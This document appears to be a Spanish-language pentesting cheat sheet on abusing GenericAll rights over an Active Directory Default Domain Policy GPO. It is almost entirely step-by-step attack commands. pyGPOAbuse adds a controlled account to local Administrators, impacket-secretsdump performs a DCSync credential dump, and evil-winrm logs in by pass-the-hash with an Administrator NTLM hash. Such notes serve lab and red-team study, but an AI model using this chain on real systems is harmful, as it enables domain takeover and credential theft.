# Abuso ACL 

Tags: #AD #ACL #Linux #DCSync 

## GenericAll sobre GPO Defalut Domain Policy 

* [GPOAbuse](https://github.com/Hackndo/pyGPOAbuse)

En BloodHound se puede ver el identificador de la GPO a la cual se tiene privilegios.
- ``Distinguished Name : CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=Domain,DC=local``

```bash 
# Clonar el repositorio 
❯ git clone https://github.com/Hackndo/pyGPOAbuse.git
 
# Instalar los requerimientos para usar la tool 
❯ pip3 install -r reqirements.txt --break-system-packages 
```

```bash 
❯ python3 pygpoabuse.py -h   # Panel de ayuda 

Paso 1:
# Abusar de una GPO sobre la que el usuario tiene permisos de modificación, agregando un comando que se ejecutará cuando la GPO se aplique.
❯ python3 pygpoabuse.py <DOMAIN>/<USER>:'<PASS>' -gpo-id <GPO-GUID> -command 'net localgroup Administrators <ControlledAccount> /add' -f

	# GPO-GUID = 6AC1786C-016F-11D2-945F-00C04FB984F9
	# command = Asignar al usuario ControlledAccount cuenta privilegiada 
	# f = Forzar una tarea programada de forma privilegiada 

Paso 2:
# Verificar si el usuario controlado es administrador por SMB 
❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' 


NOTA: 
	- El cambio no es instantaneo, se debe esperar unos minutos 
	- Pero si tarda mucho, volver a ejecutar el comando varias veces 
```

```bash 
Paso 3:
# Ejecutar un DCSync 
❯ impacket-secretsdump 'domain.local/user:P@$$w0rd123!'@IP-DC 

Paso 4:
# Hacer un PtH con el hash NTLM del Administrador 
❯ evil-winrm -i IP_DC -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```